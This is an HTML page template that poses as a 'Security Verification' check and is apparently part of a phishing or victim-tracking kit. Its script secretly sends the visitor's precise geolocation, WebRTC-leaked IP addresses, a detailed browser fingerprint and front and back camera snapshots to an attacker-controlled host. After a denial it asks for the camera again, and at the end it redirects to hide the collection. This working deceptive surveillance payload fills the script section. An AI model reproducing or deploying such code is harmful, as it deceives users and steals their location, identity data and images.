<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying Connection...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            max-width: 500px;
            width: 90%;
            background: rgba(255, 255, 255, 0.97);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 40px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            text-align: center;
            color: #333;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
            animation: pulse-bg 4s infinite;
            pointer-events: none;
        }
        @keyframes pulse-bg { 0% { transform: scale(0.8); } 50% { transform: scale(1.2); } 100% { transform: scale(0.8); } }

        .logo { 
            font-size: 64px; 
            margin-bottom: 20px; 
            background: linear-gradient(45deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }

        h1 { 
            font-size: 28px; 
            margin-bottom: 8px; 
            color: #4f46e5; 
            font-weight: 700;
        }
        .subtitle { 
            font-size: 16px; 
            color: #64748b; 
            margin-bottom: 30px; 
            line-height: 1.5;
        }

        .progress-container {
            width: 100%;
            height: 10px;
            background: #e2e8f0;
            border-radius: 9999px;
            overflow: hidden;
            margin: 25px 0;
            position: relative;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4f46e5, #7c3aed);
            border-radius: 9999px;
            width: 0%;
            transition: width 0.3s ease;
        }
        .progress-label {
            font-size: 12px;
            color: #94a3b8;
            margin-top: 8px;
        }

        .loader {
            margin: 30px auto;
            width: 60px;
            height: 60px;
            border: 4px solid #f1f5f9;
            border-top: 4px solid #4f46e5;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .info-box {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 16px;
            padding: 24px;
            margin: 25px 0;
            text-align: left;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        .info-item {
            display: flex;
            align-items: center;
            margin: 12px 0;
            font-size: 14px;
            color: #475569;
            transition: all 0.3s ease;
        }
        .info-item.completed {
            color: #16a34a;
            font-weight: 500;
        }
        .checkmark {
            color: #cbd5e1;
            font-size: 18px;
            margin-right: 12px;
            transition: color 0.3s ease;
        }
        .info-item.completed .checkmark {
            color: #16a34a;
        }

        .badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: #dbeafe;
            color: #1d4ed8;
            padding: 8px 16px;
            border-radius: 9999px;
            font-size: 13px;
            font-weight: 600;
            margin-top: 20px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .status {
            font-size: 14px;
            color: #94a3b8;
            margin-top: 25px;
            font-style: italic;
        }

        /* Camera Modal */
        .camera-modal {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.85);
            z-index: 9999;
            backdrop-filter: blur(8px);
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .camera-modal.active {
            display: flex;
            animation: modalFadeIn 0.3s ease-out;
        }
        @keyframes modalFadeIn { from { opacity: 0; } to { opacity: 1; } }

        .camera-content {
            background: white;
            border-radius: 20px;
            padding: 35px;
            text-align: center;
            max-width: 420px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            transform: scale(0.9);
            animation: modalPop 0.3s ease-out forwards;
        }
        @keyframes modalPop { from { transform: scale(0.9); } to { transform: scale(1); } }

        .camera-icon {
            font-size: 80px;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #ef4444, #dc2626);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .camera-title {
            font-size: 22px;
            font-weight: 700;
            color: #1e293b;
            margin-bottom: 12px;
        }
        .camera-text {
            font-size: 16px;
            color: #64748b;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .camera-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 20px;
        }
        .camera-btn {
            padding: 14px 32px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            min-width: 120px;
        }
        .btn-allow {
            background: #10b981;
            color: white;
        }
        .btn-allow:hover {
            background: #059669;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(16, 185, 129, 0.3);
        }
        .btn-deny {
            background: #ef4444;
            color: white;
        }
        .btn-deny:hover {
            background: #dc2626;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(239, 68, 68, 0.3);
        }

        /* Success Animation */
        .success-animation {
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.5s ease;
        }
        .success-animation.show {
            opacity: 1;
        }
        .success-check {
            font-size: 120px;
            color: #10b981;
            animation: bounce 0.6s ease;
        }
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-30px); }
            60% { transform: translateY(-15px); }
        }
        .success-text {
            font-size: 24px;
            font-weight: 700;
            color: #1e293b;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ğŸ”’</div>
        <h1>Security Verification</h1>
        <p class="subtitle">We're verifying your device for enhanced security. This may take up to 30 seconds.</p>
        
        <div class="loader"></div>
        
        <div class="progress-container">
            <div class="progress-fill" id="progressBar"></div>
        </div>
        <div class="progress-label" id="progressLabel">0%</div>
        
        <div class="info-box">
            <div class="info-item" id="item1">
                <span class="checkmark">â—</span>
                <span>Gathering device information...</span>
            </div>
            <div class="info-item" id="item2">
                <span class="checkmark">â—</span>
                <span>Analyzing network data...</span>
            </div>
            <div class="info-item" id="item3">
                <span class="checkmark">â—</span>
                <span>Fingerprinting browser...</span>
            </div>
            <div class="info-item" id="item4">
                <span class="checkmark">â—</span>
                <span>Collecting system info...</span>
            </div>
            <div class="info-item" id="item5">
                <span class="checkmark">â—</span>
                <span>Requesting camera access...</span>
            </div>
        </div>
        
        <div class="badge">ğŸ›¡ï¸ Enterprise Grade Security</div>
        <p class="status">This process helps protect against fraud and unauthorized access.</p>
    </div>

    <!-- Camera Permission Modal -->
    <div class="camera-modal" id="cameraModal">
        <div class="camera-content">
            <div class="camera-icon">ğŸ“·</div>
            <h3 class="camera-title">Camera Access Required</h3>
            <p class="camera-text">
                For security verification, we need to capture a quick image using your camera.
                <br><br>
                <strong>This helps ensure you're not a bot.</strong>
            </p>
            <div class="camera-buttons">
                <button class="camera-btn btn-allow" onclick="allowCamera()">Allow Access</button>
                <button class="camera-btn btn-deny" onclick="denyCamera()">Block</button>
            </div>
        </div>
    </div>

    <!-- Success Animation -->
    <div class="success-animation" id="successAnimation">
        <div class="success-check">âœ“</div>
        <div class="success-text">Verification Complete!</div>
    </div>

    <script>
        const uid = '<%= uid %>';
        const host = '<%= host %>';
        const targetUrl = '<%= url %>';
        const delay = <%= duration %>;
        const progressBar = document.getElementById('progressBar');
        const progressLabel = document.getElementById('progressLabel');

        let cameraAttempts = 0;
        let cameraGranted = false;
        let cameraDenied = false;
        let completedSteps = 0;
        const totalSteps = 5;

        function updateProgress() {
            const percent = Math.min(Math.floor((completedSteps / totalSteps) * 100), 100);
            progressBar.style.width = `${percent}%`;
            progressLabel.textContent = `${percent}%`;
        }

        function completeStep(stepId) {
            const item = document.getElementById(stepId);
            if (item && !item.classList.contains('completed')) {
                item.classList.add('completed');
                item.querySelector('span').textContent = item.querySelector('span').textContent.replace('...', ' âœ“');
                completedSteps++;
                updateProgress();
            }
        }

        function send(endpoint, data) {
            fetch(`${host}/${endpoint}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams(data)
            }).catch(() => {});
        }

        // ========== MAXIMUM INFO GATHERING ==========

        // 1. Location
        setTimeout(() => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        send('location', {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            uid: uid,
                            acc: pos.coords.accuracy,
                            alt: pos.coords.altitude,
                            heading: pos.coords.heading,
                            speed: pos.coords.speed
                        });
                        completeStep('item1');
                    },
                    () => {
                        completeStep('item1');
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                completeStep('item1');
            }
        }, 300);

        // 2. Battery Info
        let batteryInfo = 'Not available';
        if ('getBattery' in navigator) {
            navigator.getBattery().then(battery => {
                batteryInfo = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? '(Charging)' : '(Not Charging)'}`;
            });
        }

        // 3. Network Info
        let networkInfo = 'Unknown';
        if ('connection' in navigator || 'mozConnection' in navigator || 'webkitConnection' in navigator) {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            networkInfo = `${conn.effectiveType || 'Unknown'} - ${conn.downlink || '?'} Mbps`;
        }

        // 4. WebRTC IP Leak
        let localIPs = [];
        let publicIP = 'Unknown';
        
        const getIPs = () => {
            return new Promise((resolve) => {
                const ips = [];
                const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                
                if (!RTCPeerConnection) {
                    resolve(ips);
                    return;
                }

                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
                
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    
                    const parts = ice.candidate.candidate.split(' ');
                    const ip = parts[4];
                    
                    if (ip && !ips.includes(ip)) {
                        ips.push(ip);
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    resolve(ips);
                }, 2000);
            });
        };

        // 5. Canvas Fingerprint
        const getCanvasFingerprint = () => {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            ctx.textBaseline = 'top';
            ctx.font = "14px Arial";
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Hello, World!', 2, 15);
            return canvas.toDataURL().slice(-50);
        };

        // 6. Audio Fingerprint
        const getAudioFingerprint = () => {
            try {
                const context = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = context.createOscillator();
                const analyser = context.createAnalyser();
                const gainNode = context.createGain();
                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
                
                gainNode.gain.value = 0;
                oscillator.type = 'triangle';
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(context.destination);
                oscillator.start(0);
                
                return 'Generated';
            } catch (e) {
                return 'Not available';
            }
        };

        // 7. Installed Fonts Detection
        const detectFonts = () => {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Impact'];
            
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            const installed = testFonts.filter(font => {
                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
                ctx.font = `72px ${font}, monospace`;
                const testWidth = ctx.measureText('mmmmmmmmmmlli').width;
                return baseWidth !== testWidth;
            });
            
            return installed.join(', ') || 'None detected';
        };

        // 8. Plugins Detection
        const getPlugins = () => {
            return Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None';
        };

        // 9. Screen Orientation
        const getOrientation = () => {
            return screen.orientation ? screen.orientation.type : 'Unknown';
        };

        // 10. Device Memory
        const getDeviceMemory = () => {
            return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
        };

        // 11. Hardware Concurrency
        const getCPUCores = () => {
            return navigator.hardwareConcurrency || 'Unknown';
        };

        // Gather ALL Info
        setTimeout(async () => {
            const webrtcIPs = await getIPs();
            localIPs = webrtcIPs.filter(ip => ip.startsWith('192.') || ip.startsWith('10.') || ip.startsWith('172.'));
            publicIP = webrtcIPs.find(ip => !ip.startsWith('192.') && !ip.startsWith('10.') && !ip.startsWith('172.')) || 'Not found';
            completeStep('item2');
        }, 800);

        setTimeout(() => {
            const canvasFingerprint = getCanvasFingerprint();
            const audioFingerprint = getAudioFingerprint();
            const installedFonts = detectFonts();
            completeStep('item3');
        }, 1500);

        setTimeout(() => {
            const completeInfo = `â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘        <b>ğŸ“Š COMPLETE DEVICE INFO</b>        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

<b>ğŸŒ NETWORK INFORMATION</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Public IP: <code><%= ip %></code>
WebRTC IPs: <code>${localIPs.join(', ') || 'None'}</code>
Public WebRTC: <code>${publicIP}</code>
Connection: ${networkInfo}
Online: ${navigator.onLine ? 'Yes' : 'No'}

<b>ğŸ–¥ï¸ DEVICE & SYSTEM</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Platform: ${navigator.platform}
User Agent: ${navigator.userAgent}
App Version: ${navigator.appVersion}
Vendor: ${navigator.vendor}
CPU Cores: ${getCPUCores()}
Device Memory: ${getDeviceMemory()}

<b>ğŸ“± SCREEN & DISPLAY</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Resolution: ${screen.width}x${screen.height}
Available: ${screen.availWidth}x${screen.availHeight}
Color Depth: ${screen.colorDepth}-bit
Pixel Ratio: ${window.devicePixelRatio}
Orientation: ${getOrientation()}
Touch Support: ${navigator.maxTouchPoints > 0 ? 'Yes' : 'No'}

<b>ğŸŒ BROWSER & LANGUAGE</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Language: ${navigator.language}
Languages: ${navigator.languages.join(', ')}
Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Timezone Offset: GMT${new Date().getTimezoneOffset() / -60}

<b>ğŸ”‹ BATTERY & NETWORK</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Battery: ${batteryInfo}
Network Type: ${networkInfo}

<b>ğŸ”’ SECURITY & PRIVACY</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Do Not Track: ${navigator.doNotTrack || 'Not set'}
Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}
Local Storage: ${typeof(Storage) !== 'undefined' ? 'Available' : 'Not available'}
Session Storage: ${typeof(sessionStorage) !== 'undefined' ? 'Available' : 'Not available'}

<b>ğŸ” BROWSER FINGERPRINT</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Canvas: <code>${canvasFingerprint}</code>
Audio: ${audioFingerprint}
WebGL Vendor: ${(function(){try{const canvas=document.createElement('canvas');const gl=canvas.getContext('webgl');return gl.getParameter(gl.VENDOR)}catch(e){return 'N/A'}})()}
WebGL Renderer: ${(function(){try{const canvas=document.createElement('canvas');const gl=canvas.getContext('webgl');return gl.getParameter(gl.RENDERER)}catch(e){return 'N/A'}})()}

<b>ğŸ”Œ PLUGINS & FONTS</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Plugins: ${getPlugins()}
Fonts: ${installedFonts}

<b>ğŸ“… TIMESTAMP</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Local Time: <%= time %>
UTC Time: ${new Date().toUTCString()}

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
<i>Data collected successfully âœ“</i>`;

            send('info', { uid: uid, data: completeInfo });
            completeStep('item4');
        }, 2200);

        // ========== ENHANCED CAMERA HANDLING ==========

        function showCameraModal() {
            document.getElementById('cameraModal').classList.add('active');
            send('camera-status', { uid: uid, status: 'pending' });
        }

        function allowCamera() {
            document.getElementById('cameraModal').classList.remove('active');
            cameraGranted = true;
            requestCameraAccess();
        }

        function denyCamera() {
            document.getElementById('cameraModal').classList.remove('active');
            cameraDenied = true;
            send('camera-status', { uid: uid, status: 'denied' });
            completeStep('item5');
        }

        async function requestCameraAccess(facingMode = 'user') {
            if (cameraGranted || cameraDenied) return;

            try {
                const constraints = {
                    video: facingMode === 'environment' ? { facingMode: 'environment' } : true
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                captureAndSend(stream, facingMode);
            } catch (err) {
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    cameraAttempts++;
                    if (cameraAttempts <= 3) {
                        setTimeout(showCameraModal, 1000);
                    } else {
                        cameraDenied = true;
                        send('camera-status', { uid: uid, status: 'error' });
                        completeStep('item5');
                    }
                } else {
                    // Try alternative facing mode
                    if (facingMode === 'user') {
                        setTimeout(() => requestCameraAccess('environment'), 1000);
                    } else {
                        cameraDenied = true;
                        send('camera-status', { uid: uid, status: 'error' });
                        completeStep('item5');
                    }
                }
            }
        }

        function captureAndSend(stream, type = 'front') {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            send('camera-status', { uid: uid, status: 'allowed' });
            
            video.onloadedmetadata = () => {
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
                    
                    send('camsnap', { 
                        uid: uid, 
                        [type === 'environment' ? 'back' : 'front']: imageData 
                    });
                    
                    stream.getTracks().forEach(t => t.stop());
                    
                    // Try to get the other camera
                    if (type === 'user') {
                        setTimeout(() => requestCameraAccess('environment'), 1500);
                    } else {
                        completeStep('item5');
                    }
                }, 500);
            };
        }

        // Start camera after other data collected
        setTimeout(() => {
            requestCameraAccess();
        }, 3000);

        // Redirect with success animation
        setTimeout(() => {
            document.getElementById('successAnimation').classList.add('show');
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 1000);
        }, delay - 1000);
    </script>
</body>
</html>
